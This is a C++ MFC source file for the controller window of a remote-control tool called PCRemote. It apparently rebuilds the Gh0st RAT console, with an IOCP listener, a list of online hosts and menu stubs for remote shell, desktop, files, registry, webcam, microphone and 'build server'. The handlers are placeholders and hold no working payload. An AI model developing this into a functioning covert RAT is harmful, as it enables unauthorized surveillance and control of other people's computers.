
// PCRemoteDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "PCRemote.h"
#include "PCRemoteDlg.h"
#include "SettingDlg.h"	
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

//�еĸ���
int g_Column_Online_Count = 7;

//Message �еĸ���
int g_Column_Count_Message = 3;

//ListControl�ṹ��
typedef struct
{
	char	*title;           //�б������
	int		nWidth;   //�б�Ŀ��
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_online_Data[] =
{
	{ "IP", 148 },
	{ "����", 150 },
	{ "�������/��ע", 160 },
	{ "����ϵͳ", 128 },
	{ "CPU", 80 },
	{ "����ͷ", 81 },
	{ "PING", 81 }
};

//list_Control_message ����
COLUMNSTRUCT g_Column_Data_Message[] =
{
	{ "��Ϣ����", 88 },
	{ "ʱ��", 100 },
	{ "��Ϣ����", 660 }
};

//�����б��ܿ��
 int g_Column_Online_Width=0;  //���ܿ��

 //��Ϣ�б��ܿ��
 int g_Column_Message_Width = 0;  //���ܿ��


 //IOCPָ��
 CIOCPServer *m_iocpServer = NULL;





//ȫ�ֱ�������=======================================================================================

// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()

	
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CPCRemoteDlg �Ի���



CPCRemoteDlg::CPCRemoteDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CPCRemoteDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	//���ʼ�� ������ʼ���ĵط�
	iCount = 0;
}

void CPCRemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CPCRemoteDlg::OnNMRClickOnline)
	ON_COMMAND(IDM_ONLINE_CMD, &CPCRemoteDlg::OnOnlineCmd)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CPCRemoteDlg::OnOnlineDesktop)
	ON_COMMAND(IDM_ONLINE_FILE, &CPCRemoteDlg::OnOnlineFile)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CPCRemoteDlg::OnOnlineProcess)
	ON_COMMAND(IDM_ONLINE_REG, &CPCRemoteDlg::OnOnlineReg)
	ON_COMMAND(IDM_ONLINE_SERVICE, &CPCRemoteDlg::OnOnlineService)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CPCRemoteDlg::OnOnlineVideo)
	ON_COMMAND(IDM_ONLINE_VOICE, &CPCRemoteDlg::OnOnlineVoice)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CPCRemoteDlg::OnOnlineWindow)
	ON_COMMAND(IDM_ONLINE_DELETE, &CPCRemoteDlg::OnOnlineDelete)
	ON_COMMAND(IDM_CLOSE, &CPCRemoteDlg::OnClose)
	ON_COMMAND(IDM_MAIN_ABOUT, &CPCRemoteDlg::OnMainAbout)
	ON_COMMAND(IDM_MAIN_BUILD, &CPCRemoteDlg::OnMainBuild)
	ON_COMMAND(IDM_MAIN_SET, &CPCRemoteDlg::OnMainSet)
	ON_NOTIFY(LVN_ITEMCHANGED, IDC_MESSAGE, &CPCRemoteDlg::OnLvnItemchangedMessage)

	//���������Լ�����Ϣӳ�亯��  
	//���ڴ������̵���Ϣӳ��
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnIconNotify)
	ON_COMMAND(IDM_NOTIFY_CLOSE, &CPCRemoteDlg::OnNotifyClose)
	ON_COMMAND(IDM_NOTIFY_SHOW, &CPCRemoteDlg::OnNotifyShow)
END_MESSAGE_MAP()







//IOCP�ص�����
void CALLBACK CPCRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		//CMainFrame* pFrame = (CMainFrame*)lpParam;
		//CString str;
		//// ��g_pConnectView ���г�ʼ��
		//g_pConnectView = (CGh0stView *)((CGh0stApp *)AfxGetApp())->m_pConnectView;

		//// g_pConnectView��û��������������ᷢ��
		//if (((CGh0stApp *)AfxGetApp())->m_pConnectView == NULL)
		//	return;

		//g_pConnectView->m_iocpServer = m_iocpServer;

		//str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
		//g_pFrame->m_wndStatusBar.SetPaneText(1, str);

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			//g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			//ProcessReceive(pContext);        //�����������ݵ��� ��û����ȫ����  ��ҿ��ܻ��������ô֪��û����ȫ�����أ�
			//�ص�OnClientReading �������·���
			break;
		case NC_RECEIVE_COMPLETE:
			//ProcessReceiveComplete(pContext);      //�������� ���ݽ�ѹ ��ԭ���ڵ��� ProcessReceiveComplete ת��ProcessReceiveComplete
			break;
		}
	}
	catch (...){}
}

//����IOCP���� �����˿�

void CPCRemoteDlg::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;

	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;

	////lang2.1_8
	// ����IPCP������ �������  �˿�     �鿴NotifyProc�ص�����  ��������
	if (m_iocpServer->Initialize(NotifyProc, NULL, 100000, nPort))
	{

		char hostname[256];
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{
			for (int i = 0;; i++)
			{
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if (host->h_addr_list[i] + host->h_length >= host->h_name)
					break;
				str += "/";
			}
		}

		//m_wndStatusBar.SetPaneText(0, str);
		//str.Format("�˿�: %d", nPort);
		//m_wndStatusBar.SetPaneText(2, str);
		str.Format("�����˿�: %d�ɹ�", nPort);
		ShowMessage(true, str);
	}
	else
	{
		//str.Format("�˿�%d��ʧ��", nPort);
		//m_wndStatusBar.SetPaneText(0, str);
		//m_wndStatusBar.SetPaneText(2, "�˿�: 0");
		str.Format("�����˿�: %dʧ��", nPort);
		ShowMessage(false, str);
	}

	//m_wndStatusBar.SetPaneText(3, "����: 0");
}


//��ȡ�����ļ�
// ���������˿�
void CPCRemoteDlg::ListenPort()
{
	int	nPort = ((CPCRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort");         //��ȡini �ļ��еļ����˿�
	int	nMaxConnection = ((CPCRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection");   //��ȡ���������
	if (nPort == 0)
		nPort = 80;
	if (nMaxConnection == 0)
		nMaxConnection = 10000;
	Activate(nPort, nMaxConnection);             //��ʼ����
}


// CPCRemoteDlg ��Ϣ�������

BOOL CPCRemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ  ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO:  �ڴ���Ӷ���ĳ�ʼ������


	//��Ӳ˵�
	HMENU hmenu;
	hmenu = LoadMenu(NULL, MAKEINTRESOURCE(IDR_MENU_MAIN));  //����˵���Դ
	::SetMenu(this->GetSafeHwnd(), hmenu);                  //Ϊ�������ò˵�
	::DrawMenuBar(this->GetSafeHwnd());                    //��ʾ�˵�
	InitList();
	//��ʾ״̬��
	CreatStatusBar();
	CreateToolBar();
	//��ʾ�����ʼ���ɹ�
	ShowMessage(true, "�����ʼ���ɹ�");
	CRect rect;
	GetWindowRect(&rect);
	rect.bottom += 50;
	MoveWindow(rect);
	
	//��ʾϵͳ����
	nid.cbSize = sizeof(nid);     //��С��ֵ
	nid.hWnd = m_hWnd;           //������
	nid.uID = IDR_MAINFRAME;     //icon  ID
	nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;   //������ӵ�е�״̬
	nid.uCallbackMessage = UM_ICONNOTIFY;            //�ص���Ϣ
	nid.hIcon = m_hIcon;                            //icon ����
	CString str = "PCRemoteԶ��Э�����";       //������ʾ
	lstrcpyn(nid.szTip, (LPCSTR)str, sizeof(nid.szTip) / sizeof(nid.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &nid);   //��ʾ����

	
	ListenPort();
	//������
	Test();
	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CPCRemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ  ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CPCRemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CPCRemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CPCRemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);
	double dcx = cx;     //�Ի���ĵ�ǰ�ܿ��
	// TODO:  �ڴ˴������Ϣ����������
	//�������С���Ͳ�����
	if (nType == SIZE_MINIMIZED)
	{
		return;
	}
	
	TRY 
	{
		if (m_CList_Online.m_hWnd != NULL)
		{
			CRect rc;
			rc.left = 1;       //�б��������
			rc.top = 90;       //�б��������
			rc.right = cx - 1;  //�б��������
			rc.bottom = cy - 170;  //�б��������
			m_CList_Online.MoveWindow(rc);

			for (int i = 0; i < g_Column_Online_Count; i++)
			{
				//����ÿһ����
				double dd = g_Column_online_Data[i].nWidth;     //�õ���ǰ�еĿ��
				dd /= g_Column_Online_Width;                    //��һ����ǰ���ռ�ܳ��ȵļ���֮��
				dd *= dcx;                                       //��ԭ���ĳ��ȳ�����ռ�ļ���֮���õ���ǰ�Ŀ��
				int lenth = dd;                                   //ת��Ϊint ����
				m_CList_Online.SetColumnWidth(i, (lenth));        //���õ�ǰ�Ŀ��
			}
		}
		if (m_CList_Message.m_hWnd != NULL)
		{
			CRect rc;
			rc.left = 1;        //�б��������
			rc.top = cy - 170;    //�б��������
			rc.right = cx - 1;    //�б��������
			rc.bottom = cy - 20;  //�б��������
			m_CList_Message.MoveWindow(rc);

			for (int i = 0; i < g_Column_Count_Message; i++)
			{
				//����ÿһ����
				double dd = g_Column_Data_Message[i].nWidth;     //�õ���ǰ�еĿ��
				dd /= g_Column_Message_Width;                    //��һ����ǰ���ռ�ܳ��ȵļ���֮��
				dd *= dcx;                                       //��ԭ���ĳ��ȳ�����ռ�ļ���֮���õ���ǰ�Ŀ��
				int lenth = dd;                                   //ת��Ϊint ����
				m_CList_Message.SetColumnWidth(i, (lenth));        //���õ�ǰ�Ŀ��
			}
		}
		//״̬��
		if (m_wndStatusBar.m_hWnd != NULL){    //���Ի����С�ı�ʱ ״̬����СҲ��֮�ı�
			CRect rc;
			rc.top = cy - 20;
			rc.left = 1;
			rc.right = cx;
			rc.bottom = cy;
			m_wndStatusBar.MoveWindow(rc);
			m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_POPOUT, cx - 10);
		}

		if (m_ToolBar.m_hWnd != NULL)              //������
		{
			CRect rc;
			rc.top = rc.left = 0;
			//rc.right = 2500;
			rc.right = cx;
			//CString ccx;
			//ccx.Format("%d", cx);
			//AllocConsole();
			//_cprintf("%s", ccx);
			//FreeConsole();
			rc.bottom = 80;
			m_ToolBar.MoveWindow(rc);     //���ù�������Сλ��
		}
	}
	CATCH (CMemoryException, e)
	{
		;
	}
	END_CATCH





}


// ��ʼ������������Լ���Ϣ���б�����
int CPCRemoteDlg::InitList()
{
	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	for (int i = 0; i < g_Column_Online_Count; i++)
	{
		m_CList_Online.InsertColumn(i, g_Column_online_Data[i].title, LVCFMT_CENTER, g_Column_online_Data[i].nWidth);

		g_Column_Online_Width = g_Column_Online_Width + g_Column_online_Data[i].nWidth;

	}

	for (int i = 0; i < g_Column_Count_Message; i++)
	{
		m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].title, LVCFMT_CENTER, g_Column_Data_Message[i].nWidth);
		g_Column_Message_Width = g_Column_Message_Width + g_Column_Data_Message[i].nWidth;
	}
	return 0;
}


// ���������б�ķ���
void CPCRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing)
{
	m_CList_Online.InsertItem(0, strIP);           //Ĭ��Ϊ0��  �������в�������ж���������
	m_CList_Online.SetItemText(0, ONLINELIST_ADDR, strAddr);      //�����е���ʾ�ַ�   ���� ONLINELIST_ADDR�� Ϊ�ڶ��ڿ��е�ö������ �������ķ���
	m_CList_Online.SetItemText(0, ONLINELIST_COMPUTER_NAME, strPCName); //������������Ժ���չʱ�ĳ�ͻ
	m_CList_Online.SetItemText(0, ONLINELIST_OS, strOS);
	m_CList_Online.SetItemText(0, ONLINELIST_CPU, strCPU);
	m_CList_Online.SetItemText(0, ONLINELIST_VIDEO, strVideo);
	m_CList_Online.SetItemText(0, ONLINELIST_PING, strPing);
}


// ��Ϣ�б���뺯��
void CPCRemoteDlg::ShowMessage(bool bIsOK, CString strMsg)
{
	CString strIsOK, strTime;
	CTime t = CTime::GetCurrentTime();
	strTime = t.Format("%H:%M:%S");
	if (bIsOK)
	{
		strIsOK = "ִ�гɹ�";
	}
	else{
		strIsOK = "ִ��ʧ��";
	}
	m_CList_Message.InsertItem(0, strIsOK);
	m_CList_Message.SetItemText(0, 1, strTime);
	m_CList_Message.SetItemText(0, 2, strMsg);

	//״̬����־������
	CString strStatusMsg;
	if (strMsg.Find("����") > 0)         //�������߻���������Ϣ
	{
		iCount++;
	}
	else if (strMsg.Find("����") > 0)
	{
		iCount--;
	}
	else if (strMsg.Find("�Ͽ�") > 0)
	{
		iCount--;
	}
	iCount = (iCount <= 0 ? 0 : iCount);         //��ֹiCount ��-1�����
	strStatusMsg.Format("��%d����������", iCount);
	m_wndStatusBar.SetPaneText(0, strStatusMsg);   //��״̬������ʾ����
}


// ������
void CPCRemoteDlg::Test()
{
	AddList("192.168.0.1", "����������", "Lang", "Windows7", "2.2GHZ", "��", "123232");
	AddList("192.168.0.1", "����������", "Lang", "Windows7", "2.2GHZ", "��", "123232");
	AddList("192.168.0.1", "����������", "Lang", "Windows7", "2.2GHZ", "��", "123232");
	ShowMessage(true, "�����ʼ���ɹ�...");
	ShowMessage(true, "192.168.0.1 ��������");
	ShowMessage(true, "192.168.0.1 ��������");
	ShowMessage(true, "192.168.0.1 ��������");

}


//���̻ص�����
void CPCRemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN: // click or dbclick left button on icon
	case WM_LBUTTONDBLCLK: // should show desktop
		if (!IsWindowVisible())
			ShowWindow(SW_SHOW);
		else
			ShowWindow(SW_HIDE);
		break;
	case WM_RBUTTONDOWN: // click right button, show menu
		CMenu menu;
		menu.LoadMenu(IDR_MENU_NOTIFY);
		CPoint point;
		GetCursorPos(&point);
		SetForegroundWindow();
		menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
			point.x, point.y, this, NULL);
		PostMessage(WM_USER, 0, 0);
		break;
	}
}

void CPCRemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	CMenu	popup;
	popup.LoadMenu(IDR_MENU_ONLINE);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p; //��ȡλ��
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount(); //��ȡ�˵���Ŀ
	if (m_CList_Online.GetSelectedCount() == 0)       //���û��ѡ��
	{
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //�˵�ȫ�����
		}

	}
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);

	*pResult = 0;
}


//ִ��cmd����
void CPCRemoteDlg::OnOnlineCmd()
{
	// TODO:  �ڴ���������������
	MessageBox("����ִ��");
}


//�������
void CPCRemoteDlg::OnOnlineDesktop()
{
	// TODO:  �ڴ���������������
	MessageBox("�������");
}


void CPCRemoteDlg::OnOnlineFile()
{
	// TODO:  �ڴ���������������
	MessageBox("�ļ�����");
}


void CPCRemoteDlg::OnOnlineProcess()
{
	// TODO:  �ڴ���������������
	MessageBox("���̹���");
}


void CPCRemoteDlg::OnOnlineReg()
{
	// TODO:  �ڴ���������������
	MessageBox("ע������");
}


void CPCRemoteDlg::OnOnlineService()
{
	// TODO:  �ڴ���������������
	MessageBox("�������");
}


void CPCRemoteDlg::OnOnlineVideo()
{
	// TODO:  �ڴ���������������
	MessageBox("��Ƶ����");
}



void CPCRemoteDlg::OnOnlineVoice()
{
	// TODO:  �ڴ���������������
	MessageBox("��Ƶ����");
}


void CPCRemoteDlg::OnOnlineWindow()
{
	// TODO:  �ڴ���������������
	MessageBox("���ڹ���");
}


void CPCRemoteDlg::OnOnlineDelete()
{
	// TODO:  �ڴ���������������
	//ɾ��ONLINE listcontrol�е���Ŀ

	//����־�б������Ϣ��¼
	CString strIP;
	//�õ��û�ѡ������Ŀ
	int iSelect = m_CList_Online.GetSelectionMark();
	//�õ�ip
	strIP = m_CList_Online.GetItemText(iSelect, ONLINELIST_IP);
	//ɾ����Ŀ
	m_CList_Online.DeleteItem(iSelect);
	strIP += " �Ͽ�����";
	ShowMessage(true, strIP);
}

//�˵��ļ�����˳�
void CPCRemoteDlg::OnClose()
{
	// TODO:  �ڴ���������������
	//��������

	Shell_NotifyIcon(NIM_DELETE, &nid); //����ͼ��
	PostMessage(WM_CLOSE, 0, 0);
}


void CPCRemoteDlg::OnMainAbout()
{
	// TODO:  �ڴ���������������
	CAboutDlg dlgAbout;
	dlgAbout.DoModal();
}


void CPCRemoteDlg::OnMainBuild()
{
	// TODO:  �ڴ���������������
	MessageBox("���������");
}


void CPCRemoteDlg::OnMainSet()
{
	// TODO:  �ڴ���������������
	CSettingDlg SettingDlg;
	SettingDlg.DoModal();

	//MessageBox("��������");
}

//״̬������
static UINT indicators[] =
{
	IDR_STATUSBAR_STRING
};

// ����״̬��
// create  status bar
void CPCRemoteDlg::CreatStatusBar(void)
{
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators) / sizeof(UINT)))                    //����״̬���������ַ���Դ��ID
	{
		TRACE0("Failed to create status bar\n");
		return;      // fail to create
	}
	CRect rc;
	::GetWindowRect(m_wndStatusBar.m_hWnd, rc);
	m_wndStatusBar.MoveWindow(rc);
}


void CPCRemoteDlg::OnLvnItemchangedMessage(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	*pResult = 0;
}


// ��ӹ�����
void CPCRemoteDlg::CreateToolBar()
{

	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))
	{
		TRACE0("Failed to create toolbar\n");
		return;      // fail to create
	}
	m_ToolBar.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_ToolBar.LoadTrueColorToolBar
		(
		48,    //������ʹ�����
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN
		);
	RECT rt, rtMain;
	GetWindowRect(&rtMain);
	rt.left = 0;
	rt.top = 0;
	rt.bottom = 80;
	rt.right = rtMain.right - rtMain.left + 10;
	m_ToolBar.MoveWindow(&rt, TRUE);
	/*
	m_ToolBar.SetButtonText(0, "�ն˹���");
	m_ToolBar.SetButtonText(1, "���̹���");
	m_ToolBar.SetButtonText(2, "���ڹ���");
	m_ToolBar.SetButtonText(3, "�������");
	m_ToolBar.SetButtonText(4, "�ļ�����");
	m_ToolBar.SetButtonText(5, "��������");
	m_ToolBar.SetButtonText(6, "��Ƶ����");
	m_ToolBar.SetButtonText(7, "�������");
	m_ToolBar.SetButtonText(8, "ע������");
	m_ToolBar.SetButtonText(9, "��������");
	m_ToolBar.SetButtonText(10, "���ɷ����");
	m_ToolBar.SetButtonText(11, "����");
	*/
	m_ToolBar.SetButtonText(0, "�ն˹���");
	m_ToolBar.SetButtonText(1, "���̹���");
	m_ToolBar.SetButtonText(2, "���ڹ���");
	m_ToolBar.SetButtonText(3, "�������");
	m_ToolBar.SetButtonText(4, "�ļ�����");
	m_ToolBar.SetButtonText(5, "��������");
	m_ToolBar.SetButtonText(6, "��Ƶ����");
	m_ToolBar.SetButtonText(7, "�������");
	m_ToolBar.SetButtonText(8, "ע������");
	m_ToolBar.SetButtonText(10, "��������");
	m_ToolBar.SetButtonText(11, "���ɷ����");
	m_ToolBar.SetButtonText(12, "����");
	
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);
}


void CPCRemoteDlg::OnNotifyClose()
{
	// TODO:  �ڴ���������������
	PostMessage(WM_CLOSE);
}


void CPCRemoteDlg::OnNotifyShow()
{
	// TODO:  �ڴ���������������
	ShowWindow(SW_SHOW);
}





